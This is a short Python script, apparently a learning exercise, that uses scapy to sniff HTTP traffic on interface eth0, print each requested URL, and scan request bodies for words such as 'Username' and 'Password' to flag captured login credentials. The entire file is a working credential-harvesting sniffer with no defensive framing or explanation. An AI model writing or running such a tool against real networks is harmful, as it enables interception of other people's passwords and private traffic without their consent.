import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface= interface, store= False, prn= process_sniffed_packet, filter= "")

def get_url(packet):
    host = packet[http.HTTPRequest].Host.decode() if packet[http.HTTPRequest].Host else ""
    path = packet[http.HTTPRequest].Path.decode() if packet[http.HTTPRequest].Path else ""
    url = host + path
    print(f"[+] HTTP Request >> {url}")

def get_login_info(packet):
    raw_data = packet.load
    keywords= ["Username", "user", "login", "Password", "pwd"]
    for keyword in keywords:
        if keyword in raw_data.decode():
            print("[+] Raw Data:\n\n Possible username/password >> ", raw_data)
            break

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        get_url(packet)
        if packet.haslayer(scapy.Raw):
            get_login_info(packet)

def packet_sniffer():
    try:
        while True:
            sniff("eth0")
    except KeyboardInterrupt:
        print("Quiting Packet Sniffer")

packet_sniffer()